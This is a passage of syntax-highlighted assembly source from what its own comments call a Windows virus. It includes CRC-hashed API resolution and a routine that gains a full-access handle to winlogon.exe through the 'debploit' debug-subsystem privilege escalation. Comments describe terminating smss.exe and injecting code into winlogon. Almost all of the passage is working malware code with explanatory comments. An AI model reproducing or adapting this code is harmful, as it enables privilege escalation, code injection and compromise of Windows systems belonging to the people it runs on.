</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">NtPsapi</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">rasapi</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">NtRasapi</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">popad</span><span class="sc0">
</span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">advapi</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'advapi32.dll'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">psapi</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'psapi.dll'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">rasapi</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'rasapi32.dll'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc1">;;;;;;;;;;;;;;;;;;;;</span><span class="sc0">
</span><span class="sc5">FreeLibrarys</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">pushad</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">NtKernel</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">GezApi</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">FreeLibraryCRC</span><span class="sc4">,</span><span class="sc5">FLNameLen</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">NtAdvapi</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">NtPsapi</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">NtRasapi</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">popad</span><span class="sc0">
</span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc1">;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;</span><span class="sc0">

</span><span class="sc1">;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;</span><span class="sc0">
</span><span class="sc1">;DebuggerTrickz try to gain privileges.</span><span class="sc0">
</span><span class="sc1">;in:</span><span class="sc0">
</span><span class="sc1">;   none</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;out:</span><span class="sc0">
</span><span class="sc1">;   eax = 1 no error eax = 0 error</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;</span><span class="sc0">
</span><span class="sc5">DebuggerTrickz</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">pushad</span><span class="sc0">
</span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">NoTrickGoOut</span><span class="sc0">
</span><span class="sc5">callz</span><span class="sc0"> </span><span class="sc5">GetWinlogon</span><span class="sc0">
</span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">ContinueTrick</span><span class="sc0">
</span><span class="sc5">NoTrickGoOut</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">popad</span><span class="sc0">
</span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">ContinueTrick</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc1">;now i have a handle to winlogon.exe...however i only have this access:</span><span class="sc0">
</span><span class="sc1">;PROCESS_VM_READ and PROCESS_QUERY_INFORMATION</span><span class="sc0">
</span><span class="sc1">;now we need a handle to the process but with VM_WRITE,...privileges.</span><span class="sc0">
</span><span class="sc1">;ill try to open Winlogon with full privileges...if i dont get it </span><span class="sc0">
</span><span class="sc1">;with full privileges ill use same method as debploit exploit.</span><span class="sc0">
</span><span class="sc1">;You can read about this in www.securiteam.com NT focus...</span><span class="sc0">
</span><span class="sc1">;in august of 2002 if i remember well.</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">WinlogonHand</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">NtKernel</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">GezApi</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">CloseHandleCRC</span><span class="sc4">,</span><span class="sc5">CHNameLen</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">WinlogonID</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">43Ah</span><span class="sc1">;privileges i need</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">NtKernel</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">GezApi</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">OpenProcessCRC</span><span class="sc4">,</span><span class="sc5">OPNameLen</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">Debploit</span><span class="sc0"> 
</span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc2">80h</span><span class="sc0">
</span><span class="sc5">callz</span><span class="sc0"> </span><span class="sc5">AttackWinlogon</span><span class="sc0"> </span><span class="sc1">;)</span><span class="sc0">
</span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">DebuggerNoError</span><span class="sc0">
</span><span class="sc5">jmpz</span><span class="sc0"> </span><span class="sc5">DebuggerError</span><span class="sc0">

</span><span class="sc5">Debploit</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">WinlogonHand</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">NtKernel</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">GezApi</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">CloseHandleCRC</span><span class="sc4">,</span><span class="sc5">CHNameLen</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">20h</span><span class="sc0">
</span><span class="sc5">SaveSpaceMESSAGE</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">SaveSpaceMESSAGE</span><span class="sc0"> </span><span class="sc1">;space for DBG_SS_CP_LPC_MESSAGE</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">Ntdll</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">GezApi</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">NtConnectPortCRC</span><span class="sc4">,</span><span class="sc5">NCPNameLen</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">SECURITY_QUALITY_OF_SERVICE</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">USbuf</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">PUSbuf</span><span class="sc4">],</span><span class="sc8">ebx</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">
</span><span class="sc6">div</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
</span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
</span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">NoAlign</span><span class="sc0">
</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">USbuf2</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">PUSbuf</span><span class="sc4">],</span><span class="sc8">ebx</span><span class="sc0">
</span><span class="sc5">NoAlign</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc1">;well...here we have a problem...read about NTSTATUS_DATATYPE_MISALIGNMENT</span><span class="sc0">
</span><span class="sc1">;(80000002h)for knowing this problem and you will discover how Microsoft </span><span class="sc0">
</span><span class="sc1">;do a easier life for you :P Why i must align a data for giving </span><span class="sc0">
</span><span class="sc1">;parameters to a api...WHYYYYY??? Why M$,the richest company in the world,</span><span class="sc0">
</span><span class="sc1">;cannot do a S.O that aligns my datas!!??? :( Why i must spend two days</span><span class="sc0">
</span><span class="sc1">;trying to solve this problem!!!! damn ;(</span><span class="sc0">

</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">UNICODE_STRING</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">PortHandle</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc1">;ZwConnectPort</span><span class="sc0">
</span><span class="sc1">;note i call apis from ntdll.dll with a call instead a syscall...however they can be </span><span class="sc0">
</span><span class="sc1">;called with a syscall too.</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">080000000h</span><span class="sc0">
</span><span class="sc6">jae</span><span class="sc0"> </span><span class="sc5">DebuggerError</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">Ntdll</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">GezApi</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">DbgUiConnectToDbgCRC</span><span class="sc4">,</span><span class="sc5">DUCTDNameLen</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">080000000h</span><span class="sc0">
</span><span class="sc6">jae</span><span class="sc0"> </span><span class="sc5">DebuggerError</span><span class="sc0">

</span><span class="sc1">;for now,all right...now i must send a message to dbgss,</span><span class="sc0">
</span><span class="sc1">;a create process request,and it will give me a duplicated handle</span><span class="sc0">
</span><span class="sc1">;to the process that ill specify in the message...with a small</span><span class="sc0">
</span><span class="sc1">;different...this handle will have PROCESS_TERMINATE,</span><span class="sc0">
</span><span class="sc1">;PROCESS_CREATE_THREAD!!!,PROCESS_VM_READ,</span><span class="sc0">
</span><span class="sc1">;PROCESS_VM_OPERATION,PROCESS_VM_WRITE!!!,PROCESS_DUP_HANDLE,</span><span class="sc0">
</span><span class="sc1">;PROCESS_QUERY_INFORMATION,READ_CONTROL privileges ;D</span><span class="sc0">

</span><span class="sc1">;we have already reserved space for DBG_SS_CP_LPC_MESSAGE</span><span class="sc0">
</span><span class="sc1">;in the stack in the start of debploit zone.You can see</span><span class="sc0">
</span><span class="sc1">;DBG_SS_CP_LPC_MESSAGE struct in the end of virus code</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">],</span><span class="sc2">38h</span><span class="sc0">        </span><span class="sc1">;DataSize</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">2h</span><span class="sc4">],</span><span class="sc2">80h</span><span class="sc0">   </span><span class="sc1">;MessageSize</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">18h</span><span class="sc4">],</span><span class="sc2">2h</span><span class="sc0">  </span><span class="sc1">;CREATE_PROCESS_REQUEST</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">WinlogonID</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">20h</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc1">;debugee PID...that i want duplicate handle</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">NtKernel</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">GezApi</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">GetCurrentProcessIdCRC</span><span class="sc4">,</span><span class="sc5">GCPINameLen</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">2ch</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc1">;debugger PID...me</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">NtKernel</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">GezApi</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">GetCurrentThreadIdCRC</span><span class="sc4">,</span><span class="sc5">GCTINameLen</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">30h</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc1">;debugger TID...me too</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">PortHandle</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">Ntdll</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">GezApi</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">ZwRequestPortCRC</span><span class="sc4">,</span><span class="sc5">ZRPNameLen</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc1">;now we dont need msg space reserved in stack so we use that space in</span><span class="sc0">
</span><span class="sc1">;stack for or DEBUG_EVENT</span><span class="sc0">



</span><span class="sc5">WaitEvent</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">512</span><span class="sc0">
</span><span class="sc1">;esp + 4 -&gt; DEBUG_EVENT</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">esp</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">NtKernel</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">GezApi</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">WaitForDebugEventCRC</span><span class="sc4">,</span><span class="sc5">WFDENameLen</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">esp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;dwProcessId</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">esp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;dwThreadId</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">00010002h</span><span class="sc0"> </span><span class="sc1">;CONTINUE_DEBUG</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">NtKernel</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">GezApi</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">ContinueDebugEventCRC</span><span class="sc4">,</span><span class="sc5">CDENameLen</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">],</span><span class="sc2">3</span><span class="sc0"> </span><span class="sc1">;DugEventCode == CREATE_PROCESS_DEBUG_EVENT???</span><span class="sc0">
</span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">GoodEvent</span><span class="sc0">
</span><span class="sc5">jmpz</span><span class="sc0"> </span><span class="sc5">WaitEvent</span><span class="sc0">
</span><span class="sc5">GoodEvent</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc1">;we have got the waited debug event and there </span><span class="sc0">
</span><span class="sc1">;we can find the duplicate handle to winlogon :D</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">esp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">10h</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;DEBUG_EVENT.u.CreateProcessInfo.hProcess</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">WinlogonHand</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc1">;we save the handle with full acess to winlogon</span><span class="sc0">

</span><span class="sc1">;now i have a problem.When this process terminates,winlogon will terminate too becouse</span><span class="sc0">
</span><span class="sc1">;winlogon is the debuggee process and this is the debugger.</span><span class="sc0">
</span><span class="sc1">;i think a dramatic solution...terminate smss.exe.smss initiates winlogon and win32 subsystem</span><span class="sc0">
</span><span class="sc1">;and when system hangs,it take the control and draw the blue screen of death :P.In addition</span><span class="sc0">
</span><span class="sc1">;it has implemented the dbgss.If only these are their functions,we can terminate smss and in</span><span class="sc0">
</span><span class="sc1">;this manner smms will not terminate winlogon after my process terminates...in addition we </span><span class="sc0">
</span><span class="sc1">;have broke debug subsystem ;)</span><span class="sc0">
</span><span class="sc1">;Ill do this since winlogon later i inject my code there.</span><span class="sc0">
</span><span class="sc1">;note if smss is terminated,next time virus will be executed it will not find dbgss subsystem</span><span class="sc0">
</span><span class="sc1">;and by this reason it will not infect winlogon again.</span><span class="sc0">

</span><span class="sc5">callz</span><span class="sc0"> </span><span class="sc5">AttackWinlogon</span><span class="sc0">
</span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">DebuggerError</span><span class="sc0">

</span><span class="sc5">DebuggerNoError</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc2">80h</span><span class="sc0">
</span><span class="sc6">popad</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">DebuggerError</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc2">80h</span><span class="sc0"> 
</span><span class="sc6">popad</span><span class="sc0">
